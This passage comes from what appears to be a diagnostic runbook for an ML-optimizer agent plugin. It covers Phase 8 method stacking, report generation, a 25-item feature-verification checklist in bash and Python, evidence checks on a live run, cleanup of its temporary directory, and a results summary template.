print('  patterns/dead-ends/agenda: all readable') if all_ok else print('  ✗ stuck protocol data read failed')
"
```

#### Method Stacking Ranking (Phase 8 logic)

Test `rank_methods_for_stacking()` using the real baseline plus additional method results — verifies the ranking logic Phase 8 uses. The orchestrator enters Phase 8 when analysis advises stacking (requires ≥5 improving methods).

```bash
python3 -c "
import sys, os, json
sys.path.insert(0, os.path.expanduser('$SCRIPTS'))
from pathlib import Path
from result_analyzer import rank_methods_for_stacking, load_results

results_dir = Path('/tmp/ml-opt-diagnostic/experiments/results')

# Read the real baseline
baseline = json.loads((results_dir / 'baseline.json').read_text())
base_loss = baseline['metrics'].get('loss', 1.0)

# Add method results with improving loss (building on the real baseline)
for i in range(2, 6):
    (results_dir / f'exp-stack-{i}.json').write_text(json.dumps({
        'exp_id': f'exp-stack-{i}',
        'code_branch': f'ml-opt/stack-method-{i}',
        'metrics': {'loss': base_loss * (1 - i * 0.05)},
        'config': {'lr': 0.001},
        'status': 'completed',
        'method_tier': 'method_default_hp',
    }))

# Ensure existing results have code_branch
for f in results_dir.glob('exp-*.json'):
    if 'stack' in f.stem or 'diverge' in f.stem or 'oom' in f.stem:
        continue
    data = json.loads(f.read_text())
    if not data.get('code_branch'):
        data['code_branch'] = 'ml-opt/stack-method-1'
        data.setdefault('method_tier', 'method_default_hp')
        f.write_text(json.dumps(data))

results = load_results(str(results_dir))
ranked = rank_methods_for_stacking(results, 'loss', lower_is_better=True)
if len(ranked) >= 2:
    print(f'✓ Method stacking: {len(ranked)} methods ranked for stacking')
    for m in ranked[:3]:
        print(f'  - {m[\"code_branch\"]}: {m[\"improvement_pct\"]:.1f}% improvement')
else:
    print(f'— Method stacking: {len(ranked)} methods (analysis advises, orchestrator drives stacking)')
"
```


### 6.6c: Phase 8 — Method Stacking (dynamic workflow)

Phase 8 launches the **actual** stacking workflow — but ONLY when the Phase 7 return carried a non-empty `stacking_candidates[]` (branches that beat baseline). If Phase 7 returned no candidates (the short diagnostic loop may not surface an improving branch), Phase 8 is skipped exactly as the orchestrator skips it — log SKIPPED and go to Phase 9. The workflow ranks the candidates by improvement, seeds `ml-opt/stack-1` from the strongest, then accumulates the rest one at a time: implement-agent merges each into `ml-opt/stack-N` (resolving conflicts) in a worktree, the merged branch is reviewed (code-reviewer + silent-failure-hunter) at the merge boundary, experiment-agent runs it, and analysis-agent assesses interference — all internally. There is no manual branch creation, merge, or experiment dispatch here.

**Launch the Phase 8 workflow** (args contract verified from `phase-8-stacking.md` + `phase-8-stacking.js`; `stacking_candidates` and `baseline_metric` come from the Phase 7 return / baseline):

```text
Workflow({
  scriptPath: "${CLAUDE_PLUGIN_ROOT}/skills/orchestrate/workflows/phase-8-stacking.js",
  args: {
    exp_root: "/tmp/ml-opt-diagnostic/experiments",
    project_root: "/tmp/ml-opt-diagnostic",
    primary_metric: "loss",
    lower_is_better: true,
    scope_level: "full",
    baseline_metric: <baseline loss value from experiments/results/baseline.json>,
    stacking_candidates: <the Phase 7 return's stacking_candidates[] — [{branch, improvement_pct}, ...]>,
    divergence_metric: "loss",
    divergence_lower_is_better: true,
    model_category: "supervised",
    fixed_time_budget: 30,
    fixed_epoch_budget: null,
    fixed_step_budget: null,
    budget: null
  }
})
```

Returns `{best_stack_branch, best_stack_metric, steps[]}` (`steps[]` = the per-method `{method, branch, kept}` ledger).

> CIFAR offline note: each stacked run trains on the merged branch — the persisted `train_command` must carry `--data_dir <cached cifar>` so stacked training loads CIFAR offline (throttled host).

#### Verify stacking outputs

The Phase 8 workflow did the ranking, sequential merges, per-boundary reviews (code-reviewer + silent-failure-hunter), stacked experiments, interference analysis, and — on detected interference — the evolve-on-stack chain, all internally. Read its outputs; do NOT re-run any of it manually.

```bash
python3 -c "
import json, glob, subprocess
EXP = '/tmp/ml-opt-diagnostic/experiments'

# Stack branches the workflow created
r = subprocess.run(['git','-C','/tmp/ml-opt-diagnostic','branch','--list','ml-opt/stack-*'], capture_output=True, text=True)
branches = [b.strip() for b in r.stdout.strip().split('\n') if b.strip()]
print(f'{\"✓\" if branches else \"—\"} Stacking branches: {len(branches)} ({\", \".join(branches)})')

# Stacked experiment results (workflow writes results/round-N-stacked/exp-*.json)
stacked = glob.glob(f'{EXP}/results/round-*-stacked/exp-*.json')
if stacked:
    d = json.loads(open(stacked[0]).read())
    print(f'✓ Stacked experiment: {len(stacked)} result(s), tier={d.get(\"method_tier\")}, order={d.get(\"stacking_order\")}, code_branches={len(d.get(\"code_branches\",[]))}')
else:
    print('— No stacked experiment result (Phase 8 skipped: Phase 7 returned <2 improving candidates)')

# Evolve-on-stack (the workflow evolves only when its analysis detects interference)
evolved_stack = glob.glob(f'{EXP}/results/round-*-evolved/exp-*.json')
print(f'{\"✓\" if evolved_stack else \"—\"} Evolve-on-stack: {len(evolved_stack)} result(s) (runs only on detected interference)')
"
```

```
Phase 8 Stacking (workflow-driven — all steps internal to phase-8-stacking.js):
  Candidates from Phase 7:     [N, or 0 → whole phase SKIPPED as the orchestrator skips it]
  Sequential merges → stack-N: [passed/failed]
  Per-merge review:            [code-reviewer + silent-failure-hunter at each boundary]
  Stacked experiment(s):       [passed/failed]
  Interference analysis:       [analysis-agent, inside the workflow]
  Evolve-on-stack:             [ran if interference detected, else skipped]
  Return: {best_stack_branch, best_stack_metric, steps[]}
```

### 6.7: Phase 9 — Report + Review

#### Step 1: Report (final report generation)

```text
Agent(
  description: "Diagnostic: generate final report",
  prompt: "Generate a comprehensive final report. Parameters: project_root: /tmp/ml-opt-diagnostic, primary_metric: loss, lower_is_better: true, model_description: Tiny ResNet for CIFAR-10, task_description: image classification, exp_root: /tmp/ml-opt-diagnostic/experiments. After generating the report, update your agent memory with reporting patterns, metric presentation formats, and visualization choices used for this project.",
  subagent_type: "ml-optimizer:report-agent"
)
```

**Verify:**

- `experiments/reports/final-report.md` exists
- `experiments/reports/dashboard.html` exists and contains experiment data
- `experiments/results-table.md` exists and contains results
- `experiments/artifacts/pipeline-overview.excalidraw` exists

If dashboard, results table, or excalidraw are missing, generate them manually:

```bash
python3 $SCRIPTS/dashboard.py /tmp/ml-opt-diagnostic/experiments --live --table
python3 $SCRIPTS/excalidraw_gen.py /tmp/ml-opt-diagnostic/experiments pipeline loss
```

**Results table verification:**

```bash
python3 -c "
content = open('/tmp/ml-opt-diagnostic/experiments/results-table.md').read()
ok = '# ML Optimization Results' in content and '## Results' in content
print(f'✓ results-table.md: valid') if ok else print('✗ results-table.md: missing or empty')
"
```

**Dashboard content verification (structural):**

```bash
python3 -c "
html = open('/tmp/ml-opt-diagnostic/experiments/reports/dashboard.html').read()
checks = [('<table', 'has table'), ('<tr', 'has rows'), ('baseline' , 'has baseline data')]
for pat, desc in checks:
    print(f'  {\"✓\" if pat in html else \"✗\"} Dashboard {desc}')
"
```

**Excalidraw content verification:**

```bash
python3 -c "
import json
data = json.loads(open('/tmp/ml-opt-diagnostic/experiments/artifacts/pipeline-overview.excalidraw').read())
elems = data.get('elements', [])
print(f'✓ Excalidraw: {len(elems)} elements') if elems else print('✗ Excalidraw: empty')
"
```

#### Step 2: Review (session analysis — what worked, what didn't)

```text
Agent(
  description: "Diagnostic: session review",
  prompt: "Run session review. Parameters: project_root: /tmp/ml-opt-diagnostic, exp_root: /tmp/ml-opt-diagnostic/experiments, primary_metric: loss, lower_is_better: true, scope: session. After completing, update your agent memory with optimization anti-patterns observed and actionable suggestions for this project.",
  subagent_type: "ml-optimizer:analysis-agent"
)
```


### 6.8: Feature verification checklist

Run these checks and report pass/fail for each:

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
SCRIPTS=$PLUGIN_ROOT/scripts
HOOKS=$PLUGIN_ROOT/hooks
FIX=$PLUGIN_ROOT/tests/fixtures
EXP=/tmp/ml-opt-diagnostic/experiments

EXP=/tmp/ml-opt-diagnostic/experiments
SCRIPTS=$PLUGIN_ROOT/scripts

echo "=== Feature Verification (25 items) ==="

# 1. Immutable baseline
python3 $SCRIPTS/pipeline_state.py $EXP verify-baseline 2>/dev/null \
  && echo "✓ [1/25] Immutable baseline: checksum valid" \
  || echo "✗ [1/25] Immutable baseline: FAILED"

# 2. Research agenda
python3 -c "
import json, os
if os.path.exists('$EXP/reports/research-agenda.json'):
    agenda = json.loads(open('$EXP/reports/research-agenda.json').read()).get('ideas', [])
    tried = sum(1 for i in agenda if i.get('status') == 'tried')
    untried = sum(1 for i in agenda if i.get('status') == 'untried')
    print(f'✓ [2/25] Research agenda: {len(agenda)} ideas ({tried} tried, {untried} untried)')
else:
    print('✗ [2/25] Research agenda: file missing')
"

# 3. Dead-end catalog
python3 -c "
from pathlib import Path
p = Path('$EXP/reports/dead-ends.json')
print('✓ [3/25] Dead-end catalog: exists') if p.exists() else print('— [3/25] Dead-end catalog: not triggered (OK)')
"

# 4. Dashboard (structural check)
python3 -c "
html = open('$EXP/reports/dashboard.html').read()
ok = '<table' in html and '<tr' in html
print('✓ [4/25] Dashboard: structural check passed') if ok else print('✗ [4/25] Dashboard: missing structural elements')
"

# 5. Excalidraw
test -f $EXP/artifacts/pipeline-overview.excalidraw \
  && echo "✓ [5/25] Excalidraw: pipeline diagram exists" \
  || echo "✗ [5/25] Excalidraw: missing"

# 6. Baseline checksum in state
python3 -c "
import json
state = json.loads(open('$EXP/pipeline-state.json').read())
print('✓ [6/25] Baseline checksum: stored') if 'baseline_checksum' in state else print('✗ [6/25] Baseline checksum: missing')
"

# 7. Error tracking
python3 -c "
import json, subprocess
r = subprocess.run(['python3', '$SCRIPTS/error_tracker.py', '$EXP', 'summary'], capture_output=True, text=True)
if r.returncode == 0:
    data = json.loads(r.stdout)
    n = data.get('total_events', 0)
    print(f'✓ [7/25] Error tracking: {n} events logged')
else:
    print('✗ [7/25] Error tracking: summary command failed')
"

# 8. Schema validation (all output types)
echo "--- Schema validation ---"
for pair in "results/prerequisites.json:prerequisites" "results/baseline.json:baseline" "results/implementation-manifest.json:manifest"; do
  FILE=$(echo $pair | cut -d: -f1)
  TYPE=$(echo $pair | cut -d: -f2)
  python3 $SCRIPTS/schema_validator.py $EXP/$FILE $TYPE 2>/dev/null \
    && echo "  ✓ $FILE valid" || echo "  ✗ $FILE invalid"
done
# Experiment results live under round dirs (results/round-N-<type>/exp-*.json), not flat.
shopt -s nullglob
for f in $EXP/results/round-*/exp-*.json; do
  python3 $SCRIPTS/schema_validator.py "$f" result 2>/dev/null \
    && echo "  ✓ $(basename $f) valid" || echo "  ✗ $(basename $f) invalid"
done
shopt -u nullglob
echo "✓ [8/25] Schema validation: complete"

# 9. Result metadata (placeholder verification)
python3 -c "
import json, glob
results = glob.glob('$EXP/results/round-*/exp-*.json')
issues = []
for f in results:
    data = json.loads(open(f).read())
    eid = data.get('exp_id', '?')
    if data.get('status') == 'running':
        issues.append(f'{eid}: still running')
    for field in ['method_tier', 'iteration']:
        if field not in data:
            issues.append(f'{eid}: missing {field}')
if issues:
    print('✗ [9/25] Result metadata: ' + '; '.join(issues))
else:
    print(f'✓ [9/25] Result metadata: all {len(results)} results complete')
"

# 10. Pipeline state
python3 -c "
import json
state = json.loads(open('$EXP/pipeline-state.json').read())
has_phase = 'phase' in state
has_iter = 'iteration' in state
has_choices = 'user_choices' in state
ok = has_phase and has_iter and has_choices
print(f'✓ [10/25] Pipeline state: phase={state.get(\"phase\")}, iteration={state.get(\"iteration\")}') if ok else print('✗ [10/25] Pipeline state: missing fields')
"

# 11. Error tracker CLI subcommands
echo "--- Error tracker subcommands ---"
python3 $SCRIPTS/error_tracker.py $EXP show > /dev/null 2>&1 && echo "  ✓ show" || echo "  ✗ show"
python3 $SCRIPTS/error_tracker.py $EXP patterns > /dev/null 2>&1 && echo "  ✓ patterns" || echo "  ✗ patterns"
python3 $SCRIPTS/error_tracker.py $EXP success loss true > /dev/null 2>&1 && echo "  ✓ success" || echo "  ✗ success"
python3 $SCRIPTS/error_tracker.py $EXP proposals loss true > /dev/null 2>&1 && echo "  ✓ proposals" || echo "  ✗ proposals"
python3 $SCRIPTS/error_tracker.py $EXP dead-end list > /dev/null 2>&1 && echo "  ✓ dead-end list" || echo "  ✗ dead-end list"
python3 $SCRIPTS/error_tracker.py $EXP suggestion-history > /dev/null 2>&1 && echo "  ✓ suggestion-history" || echo "  ✗ suggestion-history"
python3 $SCRIPTS/error_tracker.py $EXP agenda list > /dev/null 2>&1 && echo "  ✓ agenda list" || echo "  ✗ agenda list"
echo "✓ [11/25] Error tracker CLI: subcommands verified"

# 12. Worktree cleanup
python3 -c "
from pathlib import Path
wt = Path('$EXP/worktrees')
if wt.exists() and list(wt.iterdir()):
    print('✗ [12/25] Worktree cleanup: leftover worktrees found')
else:
    print('✓ [12/25] Worktree cleanup: no leftover worktrees')
"

# 13. Goal memory
python3 -c "
from pathlib import Path
import subprocess
goals = Path('$EXP/optimization-goals.json')
r = subprocess.run(['python3', '$SCRIPTS/goal_memory.py', '$EXP', 'summary'], capture_output=True, text=True)
if goals.exists() and r.returncode == 0 and 'OPTIMIZATION GOALS' in r.stdout:
    print('✓ [13/25] Goal memory: goals created, summary works')
else:
    missing = []
    if not goals.exists(): missing.append('goals missing')
    if r.returncode != 0: missing.append('summary failed')
    print('✗ [13/25] Goal memory: ' + ', '.join(missing))
"

# 14. Overfitting detection
python3 -c "
import sys, os
sys.path.insert(0, '$SCRIPTS')
from detect_divergence import check_overfitting
train = [0.5, 0.4, 0.3, 0.2, 0.15, 0.1]
val = [0.5, 0.55, 0.6, 0.65, 0.7, 0.75]
r = check_overfitting(train, val, patience=5)
if r['overfitting']:
    print('✓ [14/25] Overfitting detection: works (severity=' + r['severity'] + ')')
else:
    print('✗ [14/25] Overfitting detection: FAILED to detect')
"

# 15. HP interaction detection
python3 -c "
import sys, os
sys.path.insert(0, '$SCRIPTS')
from result_analyzer import detect_hp_interactions, load_results
results = load_results('$EXP/results')
out = detect_hp_interactions(results, 'loss', lower_is_better=True)
print(f'✓ [15/25] HP interactions: {len(out.get(\"interactions\", []))} detected') if 'interactions' in out else print('✗ [15/25] HP interactions: FAILED')
"

# 16. Branch scores
python3 -c "
import sys, os
sys.path.insert(0, '$SCRIPTS')
from result_analyzer import compute_branch_scores, load_results
results = load_results('$EXP/results')
scores = compute_branch_scores(results, 'loss', lower_is_better=True)
print(f'✓ [16/25] Branch scores: {len(scores)} branches scored') if isinstance(scores, dict) else print('✗ [16/25] Branch scores: FAILED')
"

# 17. Checkpoint warm-starting
python3 -c "
import sys, os, tempfile
sys.path.insert(0, '$SCRIPTS')
from experiment_setup import generate_script
from pathlib import Path
with tempfile.TemporaryDirectory() as td:
    p = generate_script(td, 'ckpt-test', 'python train.py', log_file='logs/round-1-hp/ckpt-test/train.log', checkpoint_path='/tmp/ckpt.pt')
    ok = 'CHECKPOINT_PATH' in Path(p).read_text()
    print('✓ [17/25] Checkpoint warm-start: script includes CHECKPOINT_PATH') if ok else print('✗ [17/25] Checkpoint warm-start: FAILED')
"

# 18. Experiment comparison
python3 -c "
import sys, os, json
sys.path.insert(0, '$SCRIPTS')
from result_analyzer import compare_experiments, load_results
results = load_results('$EXP/results')
ids = [k for k in results if k.startswith('exp-')][:2]
if len(ids) >= 2:
    cmp = compare_experiments('$EXP/results', ids, 'loss')
    ok = 'config_diff' in cmp and 'metrics_comparison' in cmp and 'winner' in cmp
    print(f'✓ [18/25] Experiment comparison: {ids[0]} vs {ids[1]}') if ok else print('✗ [18/25] Experiment comparison: FAILED')
else:
    print('— [18/25] Experiment comparison: need 2+ experiments')
"

# 19. Results table (Markdown)
python3 -c "
import sys, os
sys.path.insert(0, '$SCRIPTS')
from dashboard import generate_results_table
from pathlib import Path
path = generate_results_table('$EXP')
content = Path(path).read_text()
ok = '# ML Optimization Results' in content and '## Results' in content
print(f'✓ [19/25] Results table: {path}') if ok else print('✗ [19/25] Results table: FAILED')
"

# 20. Completeness enforcement (--strict mode)
python3 -c "
import sys, os
sys.path.insert(0, '$SCRIPTS')
from schema_validator import validate_result, validate_result_strict
incomplete = {'exp_id': 'test', 'status': 'completed', 'config': {}, 'metrics': {}}
normal = validate_result(incomplete)
strict = validate_result_strict(incomplete)
if normal['valid'] and not strict['valid'] and len(normal.get('warnings', [])) > 0:
    print(f'✓ [20/25] Completeness enforcement: {len(strict[\"errors\"])} issues caught in strict mode')
else:
    print('✗ [20/25] Completeness enforcement: FAILED')
"

# 21. Workflow files present
python3 -c "
from pathlib import Path
wf = Path('$PLUGIN_ROOT/skills/orchestrate/workflows')
expected = ['phase-5-research.js', 'phase-6-implement.js', 'phase-7-experiment.js', 'phase-8-stacking.js']
missing = [f for f in expected if not (wf / f).exists()]
bad_meta = [f for f in expected if (wf / f).exists() and not (wf / f).read_text().startswith('export const meta')]
if not missing and not bad_meta:
    print('✓ [21/25] Workflow files: 4/4 present, each begins with export const meta')
else:
    print('✗ [21/25] Workflow files: ' + '; '.join([f'missing {missing}' if missing else '', f'bad meta {bad_meta}' if bad_meta else '']).strip('; '))
"

# 22. Phase docs dispatch via Workflow(
python3 -c "
from pathlib import Path
refs = Path('$PLUGIN_ROOT/skills/orchestrate/references')
docs = ['phase-5-research', 'phase-6-implement', 'phase-7-experiment-loop', 'phase-8-stacking']
bad = [d for d in docs if not ((refs / f'{d}.md').exists() and 'Workflow(' in (refs / f'{d}.md').read_text())]
if not bad:
    print('✓ [22/25] Workflow dispatch: 4/4 phase-5/6/7/8 docs dispatch via Workflow(')
else:
    print(f'✗ [22/25] Workflow dispatch: docs not using Workflow(: {bad}')
"

# 23. Agent definitions present (10 agents)
python3 -c "
from pathlib import Path
agents_dir = Path('$PLUGIN_ROOT/agents')
expected = ['prerequisites', 'baseline', 'experiment', 'report', 'monitor',
            'research', 'implement', 'tuning', 'analysis', 'orchestrator']
missing = [a for a in expected if not (agents_dir / f'{a}-agent.md').exists()]
if not missing:
    print('✓ [23/25] Agent definitions: all 10 agents present')
else:
    print(f'✗ [23/25] Agent definitions: missing {missing}')
"

# 25. Evolve file handoff (ShinkaEvolve integration)
python3 -c "
import sys, os, json, tempfile, threading, time, importlib.util
# Import directly to avoid ShinkaEvolve's __init__.py (requires dotenv)
_provider_path = os.path.join('$PLUGIN_ROOT', 'skills', 'evolve', 'ShinkaEvolve', 'shinka', 'llm', 'file_handoff_provider.py')
_spec = importlib.util.spec_from_file_location('file_handoff_provider', _provider_path)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)
set_handoff_dir = _mod.set_handoff_dir
query_file_handoff = _mod.query_file_handoff

with tempfile.TemporaryDirectory() as td:
    set_handoff_dir(td)
    pending = os.path.join(td, 'evolve', 'pending')
    completed = os.path.join(td, 'evolve', 'completed')

    # Simulate orchestrator responding
    def respond():
        time.sleep(0.5)
        for f in os.listdir(pending):
            req = json.loads(open(os.path.join(pending, f)).read())
            open(os.path.join(completed, f), 'w').write(json.dumps({'content': 'evolved code'}))

    t = threading.Thread(target=respond)
    t.start()
    result = query_file_handoff('test', 'mutate this', 'system', timeout_seconds=5)
    t.join()

    if result['content'] == 'evolved code':
        print('✓ [24/25] Evolve file handoff: round-trip works')
    else:
        print('✗ [24/25] Evolve file handoff: FAILED')
"

# 26. ShinkaEvolve submodule present
if [ -d "$PLUGIN_ROOT/skills/evolve/ShinkaEvolve" ]; then
  echo "✓ [25/25] ShinkaEvolve submodule: present"
else
  echo "— [25/25] ShinkaEvolve submodule: not initialized (optional)"
fi

echo "=== Feature Verification Done ==="
```

### 6.9: 3-checkpoint evidence in a real run

This differs from Step 3.2 (synthetic hook tests) by checking what the **live agent dispatch actually produced** on disk. If Step 3.2 passes but Step 6.9 fails, the hook scripts work in isolation but the Claude Code runtime integration is broken.

Checks (each prints ✓/✗; all run regardless of individual failures):

```bash
PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT}"
export PLUGIN_ROOT
SCRIPTS="$PLUGIN_ROOT/scripts"
HOOKS="$PLUGIN_ROOT/hooks"
FIX="$PLUGIN_ROOT/tests/fixtures"
# NOTE: the Step 6.9 body references $EXP/experiments/... so EXP is the PROJECT root here.
EXP=/tmp/ml-opt-diagnostic

echo "=== 3-Checkpoint Evidence in Real Run ==="

# --- Layer 2 evidence: PreToolUse approved the agent's writes ---
# (If L2 had blocked anything critical, the pipeline would have halted before Step 6 completes)

# Round-based result file exists (proves orchestrator passed round_dir AND L2 approved)
RESULT_FILES=$(find $EXP/experiments/results -path '*/round-*/exp-*.json' 2>/dev/null | head -5)
if [ -n "$RESULT_FILES" ]; then
  echo "✓ [6.9-1] L2 evidence: at least one round-based exp-*.json exists"
else
  echo "✗ [6.9-1] L2 evidence: NO round-based exp-*.json found (experiment-agent wrote elsewhere or was blocked)"
fi

# Result JSONs are schema-valid (proves schema_validator ran and approved)
FIRST_RESULT=$(echo "$RESULT_FILES" | head -1)
if [ -n "$FIRST_RESULT" ] && [ -f "$FIRST_RESULT" ]; then
  python3 $SCRIPTS/schema_validator.py "$FIRST_RESULT" result --strict >/dev/null 2>&1
  [ $? -eq 0 ] && echo "✓ [6.9-2] L2 evidence: real experiment result passes --strict schema validation" \
               || echo "✗ [6.9-2] L2 evidence: real experiment result FAILED --strict schema validation: $FIRST_RESULT"
else
  echo "✗ [6.9-2] L2 evidence: skipped (no result file to validate)"
fi

# Completeness fields present on a completed experiment (L2 would have blocked if missing)
if [ -n "$FIRST_RESULT" ] && [ -f "$FIRST_RESULT" ]; then
  python3 -c "
import json, sys
d = json.load(open('$FIRST_RESULT'))
if d.get('status') == 'completed':
    missing = [f for f in ('iteration', 'method_tier', 'duration_seconds') if f not in d]
    if missing:
        print(f'✗ [6.9-3] L2 evidence: completed result missing fields {missing}'); sys.exit(1)
    print('✓ [6.9-3] L2 evidence: completed result has iteration/method_tier/duration_seconds')
else:
    print('✓ [6.9-3] L2 evidence: non-completed status, completeness check skipped')
"
fi

# --- Layer 3 evidence: experiment-agent contract satisfied ---

# Round-based log path (contract requires logs/<round_dir>/<exp_id>/train.log)
LOG_FILES=$(find $EXP/experiments/logs -path '*/round-*/*/train.log' 2>/dev/null | head -5)
if [ -n "$LOG_FILES" ]; then
  echo "✓ [6.9-4] L3 evidence: round-based train.log exists (experiment-agent contract satisfied)"
else
  echo "✗ [6.9-4] L3 evidence: no round-based train.log (SubagentStop should have blocked)"
fi

# Round-based script dir with purpose-based naming (train.sh not <exp-id>.sh)
SCRIPT_FILES=$(find $EXP/experiments/scripts -path '*/round-*/*/train.sh' 2>/dev/null | head -5)
if [ -n "$SCRIPT_FILES" ]; then
  echo "✓ [6.9-5] L3 evidence: round-based train.sh exists with purpose-based name"
else
  echo "✗ [6.9-5] L3 evidence: no round-based train.sh (wrong path or wrong name)"
fi

# Round-based artifacts dir
ARTIFACT_DIRS=$(find $EXP/experiments/artifacts -type d -path '*/round-*/*' 2>/dev/null | head -5)
if [ -n "$ARTIFACT_DIRS" ]; then
  echo "✓ [6.9-6] L3 evidence: round-based artifacts dir exists"
else
  echo "✗ [6.9-6] L3 evidence: no round-based artifacts dir"
fi

# --- Layer 3 evidence: baseline-agent contract satisfied ---
[ -f $EXP/experiments/results/baseline.json ] \
  && [ -f $EXP/experiments/logs/baseline/train.log ] \
  && echo "✓ [6.9-7] L3 evidence: baseline-agent produced both contracted outputs" \
  || echo "✗ [6.9-7] L3 evidence: baseline-agent missing contracted outputs"

# --- Layer 3 evidence: prerequisites-agent required_if ---
if [ -f $EXP/experiments/results/prerequisites.json ]; then
  PREPARED=$(python3 -c "import json; d=json.load(open('$EXP/experiments/results/prerequisites.json')); print(d.get('dataset',{}).get('prepared',False))")
  if [ "$PREPARED" = "True" ]; then
    [ -d $EXP/experiments/prepared-data ] \
      && echo "✓ [6.9-8] L3 evidence: required_if satisfied (prepared=True AND prepared-data/ exists)" \
      || echo "✗ [6.9-8] L3 evidence: required_if violated (prepared=True but no prepared-data/)"
  else
    echo "✓ [6.9-8] L3 evidence: required_if skipped (prepared=False, directory not required)"
  fi
else
  echo "✗ [6.9-8] L3 evidence: prerequisites.json missing (prerequisites-agent didn't run?)"
fi

# --- Layer 3 evidence: analysis-agent any_of ---
BATCH=$(ls $EXP/experiments/reports/batch-*-analysis.md 2>/dev/null | head -1)
SESSION_REVIEW=$EXP/experiments/reports/session-review.md
if [ -n "$BATCH" ] || [ -f "$SESSION_REVIEW" ]; then
  echo "✓ [6.9-9] L3 evidence: analysis-agent any_of satisfied (batch report or session review exists)"
else
  echo "✗ [6.9-9] L3 evidence: analysis-agent any_of NOT satisfied (neither batch nor session review)"
fi

# --- Layer 3 evidence: dev_notes.md running log ---
if [ -f $EXP/experiments/dev_notes.md ]; then
  ENTRY_COUNT=$(grep -cE '^## ' $EXP/experiments/dev_notes.md)
  if [ "$ENTRY_COUNT" -gt 0 ]; then
    echo "✓ [6.9-10] L3 evidence: dev_notes.md has $ENTRY_COUNT running-log entries"
  else
    echo "✗ [6.9-10] L3 evidence: dev_notes.md exists but has zero entries"
  fi
else
  echo "✗ [6.9-10] L3 evidence: dev_notes.md not created"
fi

# --- Layer 3 evidence: report-agent contract ---
[ -f $EXP/experiments/reports/final-report.md ] \
  && [ -f $EXP/experiments/reports/progress_chart.png ] \
  && echo "✓ [6.9-11] L3 evidence: report-agent produced final-report.md + progress_chart.png" \
  || echo "✗ [6.9-11] L3 evidence: report-agent missing contracted outputs"

echo "=== 3-Checkpoint Evidence Check Done ==="
```

### 6.10: Cleanup

```bash
rm -rf /tmp/ml-opt-diagnostic
```

## Step 7: Report

Summarize all results:

```text
ML Optimizer End-to-End Diagnostic Results
==========================================
Structural tests (pytest):  X/Y passed (full suite — 22 test files)
Script CLI smoke tests:     X/26 passed (21 scripts — 100% of scripts/ directory)
Hook functional tests:      X/23 passed (9 hooks — all of hooks.json except the 3 tested separately in Step 3.2)
3-checkpoint enforcement:   X/22 passed (L1 inject × 3, L2 write-validate × 11, L3 stop-verify × 8)
Workflow infrastructure:    X/Y checks passed (workflow files, meta header, node --check, Workflow( dispatch)
Agent smoke tests:          9/9 worker agents dispatched (memory: local confirmed)

Full Pipeline (phases 2/3/9 via Agent(); phases 5-8 via Workflow({scriptPath})):
  Phase 2 Prerequisites:    [passed/failed] — schema [valid/invalid]
  Phase 3 Baseline:         [passed/failed] — schema [valid/invalid], checksum [stored/missing]
  Phase 5 Research:         [passed/failed] — 3 modes tested:
    source: web:            [passed/failed] — alphaxiv [active/fallback]
    source: knowledge:      [passed/failed] — confidence cap [verified/missing]
    source: both:           [passed/failed] — web + knowledge combined
  Phase 6 Implement:        [passed/failed] — N branches created, manifest schema [valid/invalid]
  Phase 7 Experiment Loop:  [passed/failed] — N experiments (2 iterations: normal + OOM/divergence)
    - HP-Tune:              [passed/failed] — N configs proposed
    - Experiment:           [passed/failed] — schema [valid/invalid], metadata [complete/incomplete]
    - Monitor:              [passed/failed]
    - Analyze:              [passed/failed]
    - Result analyzer CLI:  [passed/failed]
  Phase 7 Evolve (ShinkaEvolve): [passed/failed/skipped] — evolve HPs → ShinkaEvolve → experiment on evolved code
  Phase 8 Stacking:         [passed/failed] — analysis triggered, N branches merged, interference resolved
  Phase 8 Evolve:           [passed/failed/skipped] — interference detection → ShinkaEvolve → re-experiment
  Phase 9 Report:           [passed/failed]
  Phase 9 Review:           [passed/failed]

Phase 7 Advanced Features (in-pipeline):
  OOM feedback loop:          [✓/✗] — OOM logged → sync → oversized batch rejected
  Divergence detection:       [✓/✗] — high_lr_divergence pattern detected
  Stuck protocol:             [✓/✗] — stop signal persisted, data readable for orchestrator judgment
  Method stacking ranking:    [✓/✗] — 5+ methods ranked for stacking

Feature Verification (25 items):
   1. Immutable baseline:     [✓/✗]
   2. Research agenda:        [✓/✗] — N ideas tracked
   3. Dead-end catalog:       [✓/—] — triggered if branches pruned
   4. Dashboard (structural): [✓/✗] — table, rows, baseline present
   5. Excalidraw diagrams:    [✓/✗]
   6. Baseline checksum:      [✓/✗]
   7. Error tracking:         [✓/✗] — N events logged
   8. Schema validation:      [✓/✗] — prerequisites, baseline, manifest, results
   9. Result metadata:        [✓/✗] — method_tier, iteration present
  10. Pipeline state:         [✓/✗] — phase/iteration/user_choices persisted
  11. Error tracker CLI:      [✓/✗] — 12 subcommands verified
  12. Worktree cleanup:       [✓/✗] — no leftover worktrees
  13. Goal memory:            [✓/✗] — goals created, summary works
  14. Overfitting detection:  [✓/✗] — check_overfitting() works
  15. HP interactions:        [✓/✗] — detect_hp_interactions() runs
  16. Branch scores:          [✓/✗] — compute_branch_scores() runs
  17. Checkpoint warm-start:  [✓/✗] — CHECKPOINT_PATH in generated script
  18. Experiment comparison:  [✓/✗] — compare_experiments() pairwise diff
  19. Results table:          [✓/✗] — results-table.md generated
  20. Completeness enforce:   [✓/✗] — --strict catches incomplete results
  21. Workflow files:         [✓/✗] — phase-{5,6,7,8}-*.js present, begin with export const meta
  22. Workflow dispatch:      [✓/✗] — phase-5/6/7/8 docs dispatch via Workflow(
  23. Agent definitions:      [✓/✗] — all 10 agents present
  24. Evolve file handoff:    [✓/✗] — ShinkaEvolve round-trip works
  25. ShinkaEvolve submodule: [✓/—] — present (optional)

Skipped phases (by design):
  Phase 0 Discovery:    Interactive (requires user Q&A) — goals simulated via scripts/goal_memory.py init-goals
  Phase 1 Understand:   Could partially test — deferred
  Phase 4 Checkpoint:   Interactive (user direction choice)
  Phase 8 Stacking:     [passed/failed] — analysis triggered, branches merged, evolve for interference, state persisted

Issues found: [none or list]
```
